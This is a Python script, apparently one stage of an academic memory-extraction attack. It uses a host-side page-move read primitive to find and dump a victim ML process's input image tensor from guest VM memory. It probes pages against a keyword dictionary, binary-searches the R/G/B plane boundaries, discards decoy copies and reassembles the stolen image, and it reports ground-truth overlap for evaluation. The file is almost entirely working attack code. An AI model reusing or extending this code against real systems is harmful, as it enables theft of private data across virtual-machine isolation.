#!/usr/bin/env python3
"""
stage3_dump.py — Stage 3: pick the real tensor among the Stage-2 candidates, dump it.

Probe: page-move PROBE_PAGES pages spread over each candidate and count dictionary
hits (MURA's coverage rule: a real image page hits some keyword, decoys mostly do
not). The best candidate is then dumped page by page under FIXED_GPA.

--gt dumps the guest-reported pages instead (known-address run, no probe).

  sudo python3 stage3_dump.py --index 0 [--gt] [--output-dir DIR]
"""
import argparse
import sys
import time
from pathlib import Path
from typing import Dict, List

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c
import shapes_map as sm
import swapio



def fixed_gpa() -> int:
    return int(c.load_json(c.DICT_CACHE_FILE)["fixed_gpa"], 16)


PROBE_POS = (24, 74, 123)     # one page inside each of the R, G, B planes


def probe(index: int, out: Path, fixed: int, cands: List[Dict], ref_pages):
    """Accept the first candidate whose probe pages hit keywords of the right channel.

    A real (3,224,224) tensor holds R, G, B planes in that order, and every keyword
    belongs to one channel, so the page in the middle of plane p must hit channel-p
    keywords. Other buffers can also hold image floats (the transform output, GPU
    staging copies) — any of them that passes is an ordered copy of the same image
    and decodes just as well. Probing stops at a candidate's first failing page.
    """
    import numpy as np
    pdir = out / f"probe_{index}"
    scores, swaps = [], 0
    for ci, cand in enumerate(cands):
        pages = cand["channel_pages_int"]
        ok = 0
        for plane, pos in enumerate(PROBE_POS):
            if pos >= len(pages):
                break
            swapio.pace(swaps)
            swaps += 1
            f = pdir / f"c{ci:02d}_p{plane}.out"
            if not swapio.swap_read(fixed, pages[pos], f):
                break
            h = sm.page_hits(c.parse_dump(f), ref_pages)[:, 0]
            h = h[h >= 0]
            if len(h) == 0 or np.bincount(h, minlength=3).argmax() != plane:
                break
            ok += 1
        scores.append({"consistent": ok})
        print(f"  [probe] cand {ci} (parts={cand.get('parts')}): {ok}/3 planes consistent")
        if ok == len(PROBE_POS):
            return ci, scores, swaps
    best = max(range(len(scores)), key=lambda k: scores[k]["consistent"]) if scores else 0
    return best, scores, swaps


PLANE_CAP = 3 * c.PLANE_PAGES   # probe-stage cap per plane (segments include foreign pages)
GO_SLACK_NS = 2_000_000
DUMP_MAX = 300
BURST_SEARCH = 30          # segments after the request searched for the copy burst
PIECE_MIN_HITS = 8          # a tensor page hits keywords in most of its 256 blocks
PIECE_SCAN_MAX = 80         # pieces scanned before giving up
PIECE_END_GAP = 2000        # writes after the last accepted piece before stopping


def piece_probe(index: int, out: Path, fixed: int, pieces: List[Dict], ref_pages):
    """Assemble the tensor from physical runs that hold image data.

    Stage 2 lists the physically contiguous runs of the write trace in write order.
    The tensor copy is a few such runs written back to back (32-page runs in the
    11-12 traces), interleaved with unrelated runs; one page-move read of each
    run's middle page tells them apart (an image page hits the dictionary in most
    blocks, other memory almost never) and says which channel plane it is in.

    Planes come R, G, B, 49 pages each. Other copies of the image exist too
    (11-12 #5: R-only runs before the real tensor; GPU staging after it), so:
      * a channel going backwards before B was reached restarts the assembly;
      * after B was reached it ends the scan;
      * each plane keeps at most PLANE_CAP pages, the runs closest to the next
        plane (earlier R runs are the decoys);
      * the scan ends once B holds a plane's worth of pages.
    """
    import numpy as np
    pdir = out / f"probe_{index}"
    acc, log, swaps = [], [], 0
    for pi, p in enumerate(pieces[:PIECE_SCAN_MAX]):
        if acc and p["k0"] > acc[-1][1]["k1"] + PIECE_END_GAP:
            break
        # Two picks: a segment can mix tensor pages with interleaved foreign ones.
        L = len(p["pages"])
        picks = list(dict.fromkeys([p["pages"][L // 3], p["pages"][(2 * L) // 3]]))
        h = np.zeros(0, np.int64)
        for qi, g in enumerate(picks):
            swapio.pace(swaps)
            swaps += 1
            f = pdir / f"piece{pi:03d}_{qi}.out"
            if not swapio.swap_read(fixed, g, f):
                continue
            hh = sm.page_hits(c.parse_dump(f), ref_pages)[:, 0]
            hh = hh[hh >= 0]
            if len(hh) >= PIECE_MIN_HITS:
                h = hh
                break
        ch = int(np.bincount(h, minlength=3).argmax()) if len(h) else -1
        log.append({"piece": pi, "len": len(p["pages"]), "hits": int(len(h)), "ch": ch})
        if len(h) < PIECE_MIN_HITS:
            continue
        acc.append((ch, p))
        total = sum(len(x[1]["pages"]) for x in acc)
        # Order and stale pages are sorted out after the dump (assemble_by_channel);
        # here only decide when enough of the request's writes are covered.
        if (any(x[0] == 2 for x in acc) and total >= c.IMG_PAGES + 1) or total >= DUMP_MAX \
                or len(p["pages"]) >= c.IMG_PAGES:          # one burst holds the whole copy
            break
    sel = [p for _, p in acc]
    print(f"  [piece-probe] {len(sel)} run(s) kept of {len(log)} probed, "
          f"{sum(len(p['pages']) for p in sel)} pages, accepted channels {[x for x, _ in acc]}")
    return sel, log, swaps


LOCALIZER = "runhit"         # "runhit" (2MB blocks, LLM/MURA style) or "pieces" (11-13 main run)


def block_probe(index: int, out: Path, fixed: int, blocks: List[Dict], ref_pages):
    """Probe Stage 2's run*hit top-K 2MB blocks: two page-move reads per block (at
    1/3 and 2/3 of its slice pages in write order). A block holding tensor pages
    hits the dictionary in most blocks of the page; the tensor (148 pages) may span
    two or three 2MB blocks, so every block that hits is kept, not only the best.
    Returns the kept blocks' pages merged in first-write order."""
    import numpy as np
    pdir = out / f"probe_{index}"
    log, swaps, kept = [], 0, []
    for bi, b in enumerate(blocks):
        L = len(b["pages"])
        picks = list(dict.fromkeys([b["pages"][L // 3], b["pages"][(2 * L) // 3]]))
        best = np.zeros(0, np.int64)
        for qi, g in enumerate(picks):
            swapio.pace(swaps)
            swaps += 1
            f = pdir / f"block{bi:02d}_{qi}.out"
            if not swapio.swap_read(fixed, g, f):
                continue
            hh = sm.page_hits(c.parse_dump(f), ref_pages)[:, 0]
            hh = hh[hh >= 0]
            if len(hh) > len(best):
                best = hh
            if len(hh) >= PIECE_MIN_HITS:
                break
        ch = int(np.bincount(best, minlength=3).argmax()) if len(best) else -1
        log.append({"block": b["block"], "rank": bi, "score": b["score"], "len": L,
                    "hits": int(len(best)), "ch": ch})
        if len(best) >= PIECE_MIN_HITS:
            kept.append(b)
    merged = sorted(((k, g) for b in kept for g, k in zip(b["pages"], b["k"])))
    pages = list(dict.fromkeys(g for _, g in merged))
    print(f"  [block-probe] {len(kept)}/{len(blocks)} block(s) hit "
          f"{[x['rank'] for x in log if x['hits'] >= PIECE_MIN_HITS]}, {len(pages)} pages")
    return pages, log, swaps


def burst_locate(index: int, out: Path, fixed: int, burst: List[int], ref_pages):
    """The tensor copy is 148 consecutive writes inside one long burst (11-12 pilot2
    #0: 20 foreign writes, the 148 tensor pages, then 157 foreign). Find one page of
    the G plane by a stride-32 scan, then binary-search the R->G and G->B boundaries;
    the tensor is then [R->G - 49, G->B + 49). ~20 page-move reads instead of
    dumping the whole burst. Returns (pages, probes) or (None, probes)."""
    import numpy as np
    pdir = out / f"probe_{index}"
    cache, n = {}, [0]

    def ch(i):
        if i in cache:
            return cache[i]
        if i < 0 or i >= len(burst):
            return -1
        swapio.pace(n[0])
        n[0] += 1
        f = pdir / f"burst_{i:04d}.out"
        r = -1
        if swapio.swap_read(fixed, burst[i], f):
            h = sm.page_hits(c.parse_dump(f), ref_pages)[:, 0]
            h = h[h >= 0]
            if len(h) >= PIECE_MIN_HITS:
                r = int(np.bincount(h, minlength=3).argmax())
        cache[i] = r
        return r

    P = c.PLANE_PAGES
    g = next((i for i in range(P // 2, len(burst), 32) if ch(i) == 1), None)
    if g is None:
        return None, n[0], cache
    lo, hi = max(0, g - P), g            # last non-G .. first G, R->G boundary
    while lo < hi:
        mid = (lo + hi) // 2
        if ch(mid) == 1:
            hi = mid
        else:
            lo = mid + 1
    rg = lo
    lo, hi = g, min(len(burst), g + P + 1)   # first B
    while lo < hi:
        mid = (lo + hi) // 2
        if ch(mid) == 2:
            hi = mid
        else:
            lo = mid + 1
    gb = lo
    start, end = max(0, rg - P - 1), min(len(burst), gb + P + 1)
    print(f"  [burst] G at {g}, R->G {rg}, G->B {gb} -> pages [{start},{end}) of {len(burst)} "
          f"after {n[0]} probe(s)")
    return burst[start:end], n[0], cache


ASSEMBLE_WINDOWED = False
ASSEMBLE_WIN = c.IMG_PAGES + 24     # dumped pages one tensor can span (with foreign/edge pages)
ASSEMBLE_GB_WEIGHT = 10


def assemble_by_channel(pages, dumps, ref_pages, windowed=None):
    """Recover tensor page order from the dumped pages (write order).

    Pages with dictionary hits carry a channel; the longest non-decreasing channel
    subsequence (R..G..B) marks the tensor, and hit pages that break it (stale image
    data from earlier requests, other copies) are dropped. Pages WITHOUT hits stay
    in place: an R-plane page of floor colours may match no keyword, and dropping
    it would shift every later page (11-12 pilot3: tensor pages 31-42 lost this
    way). Each plane is then capped at one plane of pages."""
    import bisect
    import numpy as np
    items = []
    for g, f in zip(pages, dumps):
        ch = -1
        if f is not None:
            h = sm.page_hits(c.parse_dump(Path(f)), ref_pages)[:, 0]
            h = h[h >= 0]
            if len(h) >= PIECE_MIN_HITS:
                ch = int(np.bincount(h, minlength=3).argmax())
        items.append((g, f, ch))
    hit_idx = [i for i, x in enumerate(items) if x[2] >= 0]
    if not hit_idx:
        return [], []

    def lnds(idx):
        tails, tpos, parent = [], [], {}
        for i in idx:
            chv = items[i][2]
            j = bisect.bisect_right(tails, chv)
            if j == len(tails):
                tails.append(chv)
                tpos.append(i)
            else:
                tails[j] = chv
                tpos[j] = i
            parent[i] = tpos[j - 1] if j > 0 else -1
        keep, i = set(), tpos[-1]
        while i >= 0:
            keep.add(i)
            i = parent[i]
        return keep

    def weighted_lnds(idx):
        # Max-weight R..G..B subsequence. Stale copies around the tensor are R-only
        # (11-17 run*hit: up to ~150 decoy R pages next to 30-60 real G/B pages), so
        # an unweighted LNDS picks the decoy R run; G/B pages outweigh R pages here.
        w = (1, ASSEMBLE_GB_WEIGHT, ASSEMBLE_GB_WEIGHT)
        best = [(0, -1)] * 3                 # per end channel: (weight, last index)
        parent = {}
        for i in idx:
            chv = items[i][2]
            prev = max(best[:chv + 1])
            parent[i] = prev[1]
            if prev[0] + w[chv] > best[chv][0]:
                best[chv] = (prev[0] + w[chv], i)
        keep, i = set(), max(best)[1]
        while i >= 0:
            keep.add(i)
            i = parent[i]
        return keep

    if windowed is None:
        windowed = ASSEMBLE_WINDOWED
    if windowed == "weighted":
        keep = weighted_lnds(hit_idx)
    elif windowed:
        # The tensor spans ~148 consecutive dumped pages and holds all three planes;
        # stale R-only copies after it can outnumber its G/B pages over the whole
        # dump (11-13 #752: 170 decoy R pages beat the real G plane). Score windows
        # of one tensor length: most channels first, then most monotone hit pages.
        best = None
        for s in hit_idx:
            keep_w = lnds([i for i in hit_idx if s <= i < s + ASSEMBLE_WIN])
            score = (len({items[i][2] for i in keep_w}), len(keep_w))
            if best is None or score > best[0]:
                best = (score, keep_w)
        keep = best[1]
    else:
        keep = lnds(hit_idx)
    lo, hi = min(keep), max(keep)
    seq = [(k, items[k]) for k in range(lo, hi + 1) if items[k][2] < 0 or k in keep]
    first = {ch: next((k for k, x in seq if x[2] == ch), None) for ch in (1, 2)}
    cap = c.PLANE_PAGES + 1
    g0 = first[1] if first[1] is not None else hi + 1
    b0 = first[2] if first[2] is not None else hi + 1
    R = [x for k, x in seq if k < g0][-cap:]
    G = [x for k, x in seq if g0 <= k < b0][:cap]
    B = [x for k, x in seq if k >= b0][:cap]
    out = R + G + B
    return [x[0] for x in out], [x[1] for x in out]


def fill_edges(sel: List[Dict], writes: List[int], n: int = c.IMG_PAGES + 1):
    """Pages the copy wrote just before the first / after the last accepted run but
    that were too scattered physically to form a run. Returned as candidates; the
    dump keeps only those that hit the dictionary."""
    have = {g for p in sel for g in p["pages"]}
    need = n - len(have)
    if need <= 0 or not sel:
        return [], []
    pre, post = [], []
    k = sel[0]["k0"] - 1
    while k >= 0 and len(pre) < 2 * need and sel[0]["k0"] - k < 6 * need:
        g = writes[k]
        if g not in have and g not in pre:
            pre.append(g)
        k -= 1
    pre.reverse()
    k = sel[-1]["k1"] + 1
    while k < len(writes) and len(post) < need and k - sel[-1]["k1"] < 3 * need:
        g = writes[k]
        if g not in have and g not in post:
            post.append(g)
        k += 1
    return pre, post


def run_stage3(index: int, out: Path, gt: bool = False) -> Dict:
    c.ensure_guest_suppressions()
    tr = c.load_json(out / f"tracked_{index}.json")
    fixed = fixed_gpa()
    ref_pages = sm.load_ref_pages()
    t0 = time.time()
    choice, scores, nprobe, edge = None, [], 0, set()
    if gt:
        pages = [g for g in tr["gt_pages_int"] if g is not None]
    elif c.USE_SERVER and tr.get("segments"):
        # Resident victim: fragmented memory, use write-time bursts after the request.
        segs = tr["segments"]
        if tr.get("t_go_ns"):
            segs = [p for p in segs if p["t0"] >= tr["t_go_ns"] - GO_SLACK_NS]
        long = next((p for p in segs[:BURST_SEARCH] if len(p["pages"]) >= c.IMG_PAGES - 1), None)
        pages = None
        if long is not None:
            pages, nprobe, cache = burst_locate(index, out, fixed, long["pages"], ref_pages)
            scores = [{"burst_len": len(long["pages"]), "probes": {str(k): v for k, v in cache.items()}}]
        if pages is None:
            sel, scores, nprobe = piece_probe(index, out, fixed, segs, ref_pages)
            pages = list(dict.fromkeys(g for p in sel for g in p["pages"]))
        edge = set(pages)
    elif LOCALIZER == "runhit" and tr.get("blocks"):
        pages, scores, nprobe = block_probe(index, out, fixed, tr["blocks"], ref_pages)
        choice = "runhit"
    elif tr.get("pieces"):
        # Fresh victim process: the tensor is a few physically contiguous runs.
        sel, scores, nprobe = piece_probe(index, out, fixed, tr["pieces"], ref_pages)
        import stage2_track as s2
        writes = [g for g, _ in s2.read_writes(out / f"wpt_{index}.log", filtered=True)]
        pre, post = fill_edges(sel, writes)
        core = list(dict.fromkeys(g for p in sel for g in p["pages"]))
        pages = pre + core + post
        edge = set(pre) | set(post)
        choice = "pieces"
    else:
        cands = tr["candidates"]
        if not cands:
            pages = []
        elif len(cands) == 1:
            pages, choice = cands[0]["channel_pages_int"], 0
        else:
            choice, scores, nprobe = probe(index, out, fixed, cands, ref_pages)
            pages = cands[choice]["channel_pages_int"]
    t_loc = time.time() - t0

    dumps, ok, kept = [], 0, []
    for k, g in enumerate(pages):
        swapio.pace(k)
        f = out / f"dump_{index}_p{k:03d}.out"
        if not swapio.swap_read(fixed, g, f):
            if g not in edge:
                dumps.append(None)
                kept.append(g)
            continue
        # Edge candidates stay only if they hold image data.
        if g in edge and sm.count_page_matches(f, ref_pages) < PIECE_MIN_HITS:
            continue
        dumps.append(str(f))
        kept.append(g)
        ok += 1
    c.ssh_run("touch /tmp/host_read_done")
    pages = kept
    pre_pages, pre_dumps = list(pages), list(dumps)
    if not gt and choice in ("runhit", "pieces"):
        pages, dumps = assemble_by_channel(pages, dumps, ref_pages)
    gset = set(g for g in tr["gt_pages_int"] if g is not None)
    meta = {"stage": 3, "index": index, "gt_mode": gt, "probe_choice": choice,
            "probe_scores": scores, "probe_swaps": nprobe, "pages_int": pages, "dumps": dumps,
            "pre_pages": pre_pages, "pre_dumps": pre_dumps,
            "dumped": ok, "gt_overlap": len(gset & set(pages)), "gt_pages": len(gset),
            "gt_exact_order": sum(1 for a, b in zip(pages, tr["gt_pages_int"]) if a == b),
            "t_localize": round(t_loc, 2), "t_dump": round(time.time() - t0 - t_loc, 2),
            "timestamp": time.time()}
    c.save_json(out / f"dump_{index}.json", meta)
    print(f"[stage3] #{index} dumped {ok}/{len(pages)}  gt-overlap {meta['gt_overlap']}/{len(gset)} "
          f"order {meta['gt_exact_order']}  loc {meta['t_localize']}s dump {meta['t_dump']}s")
    return meta


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--index", type=int, default=0)
    p.add_argument("--gt", action="store_true")
    p.add_argument("--output-dir", default=str(HERE / "runs" / "debug"))
    a = p.parse_args()
    run_stage3(a.index, Path(a.output_dir), a.gt)


if __name__ == "__main__":
    main()
